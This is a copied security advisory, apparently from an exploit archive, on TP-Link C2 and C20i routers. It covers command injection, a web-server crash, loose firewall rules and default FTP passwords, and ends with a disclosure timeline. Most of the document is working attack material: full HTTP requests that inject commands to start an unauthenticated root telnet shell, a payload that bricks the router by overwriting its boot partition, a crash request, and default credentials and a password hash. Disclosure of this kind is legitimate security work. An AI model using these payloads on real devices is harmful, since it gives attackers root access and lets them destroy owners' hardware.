@@ -1,0 +1,386 @@
+id: 26951
+date: 02/10/2017
+title: TP-Link C2 / C20i Command Injection / Denial Of Service
+author: Pierre Kim
+cves: 
+
+Title: TP-Link C2 and C20i vulnerable to command injection
+(authenticated root RCE), DoS, improper firewall rules
+Advisory URL: https://pierrekim.github.io/advisories/2017-tplink-0x00.txt
+Blog URL: https://pierrekim.github.io/blog/2017-02-09-tplink-c2-and-c20i-vulnerable.html
+Date published: 2017-02-09
+Vendors contacted: TP-Link
+Release mode: Released
+CVE: no current CVE
+
+
+
+## Product Description
+
+TP-Link is a Chinese manufacturer of computer networking products such
+as routers and IOT devices.
+
+
+
+## Vulnerabilities Summary
+
+Command Injections exist in the HTTP management interface up to the
+latest firmware version (0.9.1 4.2 v0032.0 Build 160706 Rel.37961n) of
+TP-Link C2 and C20i, allowing an authenticated attacker to get a
+remote shell with root privileges.
+An attacker can DoS the httpd server and the firewall rules are too
+permissive by default on the WAN interface.
+
+
+
+## Details - RCE with a single HTTP request
+
+Using the so-called "Diagnostic" page, the attacker can run any
+command including telnetd, using the remote host field of the ping
+utility:
+
+$(echo 127.0.0.1; /usr/sbin/telnetd -l bin/sh -p 25)
+
+While being authenticated (see the credentials in base64 format),
+sending this HTTP request directly will start a telnetd on the router
+on port 25/tcp without authentication:
+
+POST /cgi?2 HTTP/1.1
+Host: 192.168.1.1
+Content-Type: text/plain
+Referer: http://192.168.1.1/mainFrame.htm
+Content-Length: 208
+Cookie: Authorization=Basic YWRtaW46YWRtaW4=
+Connection: close
+
+
+[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6
+dataBlockSize=64
+timeout=1
+numberOfRepetitions=1
+host=$(echo 127.0.0.1; /usr/sbin/telnetd -l bin/sh -p 25)
+X_TP_ConnName=ewan_ipoe_d
+diagnosticsState=Requested
+
+
+
+An attacker can also use backsticks to execute commands:
+`echo 127.0.0.1; /usr/sbin/telnetd -l bin/sh -p 25`
+
+
+Resulting access:
+
+user@kali:~/tplink-0day-c2-and-c20i$ telnet 192.168.1.1 25
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+~ # ls
+web      usr      sbin     mnt      lib      dev
+var      sys      proc     linuxrc  etc      bin
+~ # cat /proc/version
+Linux version 2.6.36 (root@localhost.localdomain) (gcc version 4.6.3
+(Buildroot 2012.11.1) ) #1 Wed Jul 6 10:01:06 HKT 2016
+~ # ls -la
+drwxr-xr-x    9       176 web
+drwxr-xr-x   13         0 var
+drwxr-xr-x    4        38 usr
+drwxr-xr-x   11         0 sys
+drwxr-xr-x    2       193 sbin
+dr-xr-xr-x   83         0 proc
+drwxr-xr-x    2         3 mnt
+lrwxrwxrwx    1        11 linuxrc -> bin/busybox
+drwxr-xr-x    3       786 lib
+drwxr-xr-x    5       776 etc
+drwxr-xr-x    5      1274 dev
+drwxr-xr-x    2       280 bin
+drwxr-xr-x   13       177 ..
+drwxr-xr-x   13       177 .
+~ # cd etc
+/etc # ls
+vsftpd_passwd              init.d                     SingleSKU_5G_RU.dat
+vsftpd.conf                group                      SingleSKU_5G_NZ.dat
+ushare.conf                fstab                      SingleSKU_5G_MY.dat
+services                   default_config.xml         SingleSKU_5G_KR.dat
+samba                      TZ                         SingleSKU_5G_FCC.dat
+resolv.conf                SingleSKU_RU.dat           SingleSKU_5G_CE.dat
+reduced_data_model.xml     SingleSKU_NZ.dat           SingleSKU_5G_CA.dat
+ppp                        SingleSKU_MY.dat           RT2860AP5G.dat
+passwd.bak                 SingleSKU_KR.dat           RT2860AP.dat
+passwd                     SingleSKU_FCC.dat          MT7620_AP_2T2R-4L_V15.BIN
+iptables-stop              SingleSKU_CE.dat           MT7610E-V10-FEM-1ANT.bin
+inittab                    SingleSKU_5G_VN.dat
+/etc # cd ..
+~ # ls -la
+drwxr-xr-x    9       176 web
+drwxr-xr-x   13         0 var
+drwxr-xr-x    4        38 usr
+drwxr-xr-x   11         0 sys
+drwxr-xr-x    2       193 sbin
+dr-xr-xr-x   83         0 proc
+drwxr-xr-x    2         3 mnt
+lrwxrwxrwx    1        11 linuxrc -> bin/busybox
+drwxr-xr-x    3       786 lib
+drwxr-xr-x    5       776 etc
+drwxr-xr-x    5      1274 dev
+drwxr-xr-x    2       280 bin
+drwxr-xr-x   13       177 ..
+drwxr-xr-x   13       177 .
+~ # ps
+  PID USER       VSZ STAT COMMAND
+    1 admin     1060 S    init
+    2 admin        0 SW   [kthreadd]
+    3 admin        0 SW   [ksoftirqd/0]
+    4 admin        0 SW   [kworker/0:0]
+    5 admin        0 SW   [kworker/u:0]
+    6 admin        0 SW<  [khelper]
+    7 admin        0 SW   [kworker/u:1]
+   44 admin        0 SW   [sync_supers]
+   46 admin        0 SW   [bdi-default]
+   48 admin        0 SW<  [kblockd]
+   80 admin        0 SW   [kswapd0]
+   82 admin        0 SW<  [crypto]
+  130 admin        0 SW   [mtdblock0]
+  135 admin        0 SW   [mtdblock1]
+  140 admin        0 SW   [mtdblock2]
+  145 admin        0 SW   [mtdblock3]
+  150 admin        0 SW   [mtdblock4]
+  155 admin        0 SW   [mtdblock5]
+  160 admin        0 SW   [mtdblock6]
+  172 admin        0 SW   [kworker/0:1]
+  214 admin        0 SW   [khubd]
+  245 admin     1060 S    telnetd
+  251 admin     2932 S    cos
+  252 admin     1060 S    init
+  255 admin     2120 S    igmpd
+  258 admin     2144 S    mldProxy
+  345 admin     2932 S    cos
+  346 admin     2932 S    cos
+  347 admin     2932 S    cos
+  366 admin     2088 S    ntpc
+  371 admin     2096 S    dyndns /var/tmp/dconf/dyndns.conf
+  374 admin     2096 S    noipdns /var/tmp/dconf/noipdns.conf
+  377 admin     2096 S    cmxdns /var/tmp/dconf/cmxdns.conf
+  433 admin        0 SW   [RtmpCmdQTask]
+  434 admin        0 SW   [RtmpWscTask]
+  445 admin     1244 S    wlNetlinkTool
+  449 admin     1080 S    wscd -i ra0 -m 1 -w /var/tmp/wsc_upnp/
+  465 admin     1244 S    wlNetlinkTool
+  466 admin     1244 S    wlNetlinkTool
+  489 admin        0 SW   [RtmpCmdQTask]
+  490 admin        0 SW   [RtmpWscTask]
+  503 admin     1064 S    wscd_5G -i rai0 -m 1 -w /var/tmp/wsc_upnp_5G/
+  506 admin     2668 S    httpd
+  518 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  521 admin     2084 S    dnsProxy
+  526 admin     1068 S    dhcpd /var/tmp/dconf/udhcpd.conf
+  551 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  552 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  553 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  554 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  555 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  556 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  557 admin     1748 S    upnpd -L br0 -W eth0.2 -en 0 -P eth0.2 -nat 0 -port
+  558 admin     2668 S    tmpd
+  561 admin     2556 S    tdpd
+  569 admin      988 S    dhcpc
+  578 admin     1036 S    zebra -d -f /var/tmp/dconf/zebra.conf
+  594 admin     2088 S    diagTool
+  625 admin     1136 S    dropbear -p 22 -r /var/tmp/dropbear/dropbear_rsa_hos
+  642 admin     2468 S    ushare
+  658 admin     2468 S    ushare
+  660 admin     2468 S    ushare
+  661 admin     2468 S    ushare
+  662 admin     2468 S    ushare
+  663 admin     2468 S    ushare
+  664 admin     2468 S    ushare
+  666 admin     2468 S    ushare
+  851 admin     1060 S    /usr/sbin/telnetd -l /bin/sh -p 25
+  853 admin     1072 S    /bin/sh
+  876 admin     1068 S    /bin/sh
+  878 admin     2576 S    cli
+  887 admin     1060 R    ps
+~ #
+
+
+
+With this RCE, an attacker will be able to dump and modify the
+configuration by editing /dev/mtd3.
+The configuration is written in XML format and is located in the
+beginning (starting at offset 0x10) of this MTD (64K).
+
+
+If the attacker sends this string, the router will be unable to boot
+and will be bricked, by writing random characters on top of the u-boot
+partition:
+
+POST /cgi?2 HTTP/1.1
+Host: 192.168.1.1
+Content-Type: text/plain
+Referer: http://192.168.1.1/mainFrame.htm
+Content-Length: 208
+Cookie: Authorization=Basic YWRtaW46YWRtaW4=
+Connection: close
+
+
+[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6
+dataBlockSize=64
+timeout=1
+numberOfRepetitions=1
+host=$(echo 127.0.0.1; cat /dev/random > /dev/mtd0)
+X_TP_ConnName=ewan_ipoe_d
+diagnosticsState=Requested
+
+
+
+## Details - DoSing the HTTP server
+
+While being authenticated (see the credentials in base64 format),
+sending this HTTP request directly will crash the remote HTTP server:
+
+GET /cgi/ansi HTTP/1.1
+Host: 192.168.1.1
+Content-Type: text/plain
+Referer: http://192.168.1.1/mainFrame.htm
+Content-Length: 208
+Cookie: Authorization=Basic YWRtaW46YWRtaW4=
+Connection: close
+
+
+A resulting core file will be written in the router inside the /var
+partition of the attacked router:
+
+/var # ls -la /var/
+drwxrwxrwx    2         0 lock
+drwxrwxrwx    2         0 log
+drwxrwxrwx    2         0 run
+drwxrwxrwx    7         0 tmp
+drwxr-xr-x    3         0 Wireless
+drwxrwxrwx    2         0 usbdisk
+drwxrwxrwx    2         0 dev
+drwxr-xr-x    5         0 samba
+- -rw-r--r--    1       132 passwd
+drwxrwxrwx    2         0 3G
+drwxrwxrwx    2         0 l2tp
+drwxrwxrwx    7         0 vsftp
+- -rw-------    1    348160 core-httpd-506-11-1482798208
+drwxr-xr-x   13       177 ..
+drwxr-xr-x   13         0 .
+/var #
+
+
+
+## Details - Permissive Iptables rules
+
+The default iptables rules are generated within /lib/libcmm.so by
+writing commands inside /var/tmp/dconf/rc.router and using system() on
+this file.
+
+/var/tmp/dconf/rc.router:
+
+#!/bin/sh
+[...]
+iptables -t nat -A POSTROUTING -j NATLOOPBACK_UPNP_SECCONN
+iptables -t nat -A POSTROUTING -j POSTROUTING_NATLOOPBACK_DMZ
+iptables -t nat -A PREROUTING -j PREROUTING_DMZ
+iptables -t filter -A FORWARD -i br+ -j ACCEPT
+iptables -t filter -A FORWARD -d 224.0.0.0/4 -j ACCEPT
+[...]
+
+
+By default, the SNMP port is open on every interface:
+
+    iptables -A INPUT -p udp --dport 161 -j ACCEPT
+
+This can be verified with iptables on the router:
+
+/proc # iptables -nL
+Chain INPUT (policy DROP)
+[...]
+ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:161
+[...]
+
+You can check too by reading the file /var/tmp/dconf/rc.router.
+
+Luckily, even if SNMP configuration can be modified using the hidden
+/main/snmp.html webpage,
+it appears the snmpd has been removed from the firmware image.
+
+
+## Details - Misc
+
+The binaries (/usr/bin/cos, /usr/bin/tmpd, /lib/libcmm.so) are overall
+badly designed programs, executing tons of system() and running as
+root.
+
+/usr/bin/cos is a daemon running as root and is launched at the end of
+/etc/init.d/rcS (`cos &`): it starts all the daemons using system
+(httpd ntpc dnsProxy dhcpd dhcpc snmpd upnpd diagTool voip_server
+voip_client pjsua cwmp wlNetlinkTool pppd dyndns igmpd zebra ushare
+smbd vsftpd telnetd, noipdns hostapd ipsecVpn radvd mldProxy racoon
+wscd...)
+/usr/bin/tmpd is a daemon running as root and listens to 127.0.0.1:20002.
+/lib/libcmm.so is a library with all the main system functions (system
+reinitialisation
+[admin:$1$$iC.dUsGpxNNJGeOm1dFio/:0:0:root:/:/bin/sh], wifi
+configuration, debugging with TFTP[hi dutserver!], VPN configuration,
+`ifconfig interfaces`, `insmod /lib/modules/pptp.ko`, ...)
+
+
+Vsftpd contains default weak passwords:
+
+user@kali:~$ cat ./etc/vsftpd_passwd
+admin:1234:1:1;guest:guest:0:0;test:test:1:1;$
+user@kali:~$
+
+Access:
+
+admin:1234
+guest:guest
+test:test
+
+
+
+## Vendor Response
+
+T-P-Link plans to release a new firmware in February 2017, patching
+all listed vulnerabilities. T-P-Link wants to draw attention that in
+order to exploit two over three security vulnerabilities, an attacker
+would need to have valid credentials.
+
+
+
+## Report Timeline
+
+* Sep 17, 2016: Vulnerabilities found by Pierre Kim.
+* Dec 26, 2016: TP-Link support is contacted by livechat. TP-Link
+replies there is no process to handle security problems in TP-Link
+routers and refuses to indicate a security point of contact.
+* Dec 27, 2016: TP-Link support is notified of the vulnerabilities
+(using support () tp-link.com, security () tp-link.com, lishaozhang ()
+tp-link.net [from /lib/modules/ipt_STAT.ko], huangwenzhong ()
+tp-link.net [from /lib/modules/tp_domain.ko]).
+* Dec 29, 2016: Pierre sends a full advisory to TP-Link security team.
+* Dec 30, 2016: TP-Link confirms the reception of the advisory.
+* Jan 03, 2017: Pierre asks TP-Link to confirm the vulnerabilities.
+* Jan 09, 2017: TP-Link confirms the security vulnerabilities in
+TP-Link C2 and C20i routers and security patches are in progress.
+* Jan 21, 2017: Ping from TP-Link about the "Vendor Response" section.
+* Jan 23, 2017: Pierre answers, asking details in the "Vendor Response" section.
+* Jan 24, 2017: TP-Link Korea contacts Pierre Kim about the vulnerabilities.
+* Jan 27, 2017: Pierre sends a final draft to TP-Link.
+* Feb 09, 2017: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+The vulnerabilities were found by Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2017-tplink-0x00.txt
+https://pierrekim.github.io/blog/2017-02-09-tplink-c2-and-c20i-vulnerable.html
+
+#  0day.today [2023-03-26]  #
